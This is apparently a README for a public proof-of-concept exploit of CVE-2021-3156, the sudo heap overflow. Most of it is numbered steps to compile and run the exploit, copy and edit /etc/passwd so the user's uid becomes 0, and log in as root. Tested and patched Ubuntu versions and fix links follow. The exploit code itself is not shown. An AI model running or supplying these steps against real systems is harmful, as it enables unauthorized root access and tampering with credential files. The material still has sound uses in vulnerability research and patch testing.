# CVE-2021-3156

![](https://github.com/nu11secur1ty/CVE-mitre/blob/main/CVE-2021-3156/1.30.2021/logo/sudo.jpg)

- - - A different experience from `r4j`,`cts` and `stong` :)
- - - Debug @nu11secur1ty

PoC for [CVE-2021-3156](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3156) (sudo heap overflow). Exploit by @gf_256 aka cts. Thanks to r4j from super guesser for help and debug and more tests from [nu11secur1ty](https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-3156/1.30.2021). Credit to Braon Samedit of Qualys for the [original advisory](https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt).

## Proof and Exploit:
[href](https://streamable.com/umtzya)

# Instructions

1. wget/curl

2. tune RACE_SLEEP_TIME

3. gcc exploit.c -o cve-2021-3156

4. cp /etc/passwd fakepass
- - - and `cp /etc/passwd passwd_original` because you can break your system
- - - ***WARNING:*** After exploit the system, you must execute `cp passwd_original /etc/passwd` because you must restore your system and rights!

5. modify fakepass so your uid is 0

6. ./cve-2021-3156

7. Normal login with your user, in my test case the password is `password` and then you should execute `id`, to see who you are =)

---------------------------------------------------------------------------------------

Tested on Ubuntu 18.04 (sudo 1.8.21p2) and 20.04 (1.8.31)

`stong`: this bug freaking sucked to PoC, it took like 3 sisyphean days and then suddenly today I just got insanely lucky

`nu11secur1ty`: This is a stupid `development` error of Sudo developers, everyone makes mistakes. =)

# Already Patched ;)
- 17.10 - Patched
- 18.04 - Patched
- 19.04 - Vulnerable [video](https://streamable.com/umtzya)

![](https://github.com/nu11secur1ty/CVE-mitre/blob/main/CVE-2021-3156/1.30.2021/screen/19.04buffer.PNG)

- 20.04 - Patched
- 20.04.1 - Patched

- Discussions :)
```url
https://github.com/stong/CVE-2021-3156/issues/1
https://github.com/rapid7/metasploit-framework/pull/14715
```

- - - Fix Information:

[![](https://github.com/nu11secur1ty/CVE-mitre/blob/main/CVE-2021-3156/1.30.2021/logo/sudo_logo.png)](https://github.com/sudo-project/sudo/releases/tag/SUDO_1_9_5p2)

[details](https://github.com/sudo-project/sudo/blob/master/plugins/sudoers/env.c#L739)

## Patching:
[href](https://streamable.com/cmru9k)

-------------------------------------------------------------------------------
- BR [nu11secur1ty](https://www.nu11secur1ty.com/)
